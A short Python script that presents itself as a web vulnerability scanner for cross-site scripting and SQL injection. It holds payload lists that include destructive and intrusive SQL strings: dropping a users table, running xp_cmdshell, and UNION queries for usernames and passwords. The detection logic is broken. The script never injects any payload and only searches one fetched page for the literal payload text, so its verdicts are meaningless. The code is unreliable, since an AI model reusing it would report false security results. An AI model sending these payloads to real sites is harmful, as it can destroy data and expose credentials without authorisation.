import requests
from bs4 import BeautifulSoup

def check_xss(url):
    # Define various test payloads for XSS
    xss_payloads = [
        '<img src=x onerror=alert("XSS test")>',
        '"><img src=x onerror=alert("XSS test")>',
        '"><script>alert("XSS test")</script>',
        '"><svg/onload=alert("XSS test")>',
        '"\'-alert("XSS test")-\'"',
        '<iframe src="javascript:alert(\'XSS test\')"></iframe>',
        '<a href="javascript:alert(\'XSS test\')">Click me</a>',
        '<img src="javascript:alert(\'XSS test\')" alt="XSS test">',
        '<svg/onload=alert("XSS test")>',
        '<input type="image" src="x" onerror="alert(\'XSS test\')">'
    ]
    
    # Send a GET request to the URL
    response = requests.get(url)
    
    # Check if any payload is reflected in the response
    for payload in xss_payloads:
        if payload in response.text:
            print(f"XSS Vulnerability found! Payload: {payload}")
            return
    
    print("No XSS Vulnerability found.")

def check_sql_injection(url):
    # Define various test payloads for SQL Injection
    sql_payloads = [
        "' OR '1'='1'; --",
        "' OR '1'='1' UNION SELECT null, username, password FROM users; --",
        '" OR "1"="1"; --',
        '" OR "1"="1" UNION SELECT null, username, password FROM users; --',
        "1'; DROP TABLE users; --",
        "1'; SELECT * FROM information_schema.tables; --",
        "1'; EXEC xp_cmdshell('whoami'); --"  # For MS SQL Server
    ]
    
    # Send a GET request to the URL
    response = requests.get(url)
    
    # Check if any payload modifies the response (indicating potential SQL Injection)
    for payload in sql_payloads:
        if payload in response.text:
            print(f"SQL Injection Vulnerability found! Payload: {payload}")
            return
    
    print("No SQL Injection Vulnerability found.")

def main():
    # Get the web application URL from the user
    web_app_url = input("Enter the web application URL: ")
    
    # Perform XSS vulnerability check
    print("\nChecking for XSS vulnerabilities...")
    check_xss(web_app_url)
    
    # Perform SQL Injection vulnerability check
    print("\nChecking for SQL Injection vulnerabilities...")
    check_sql_injection(web_app_url)

if __name__ == "__main__":
    main()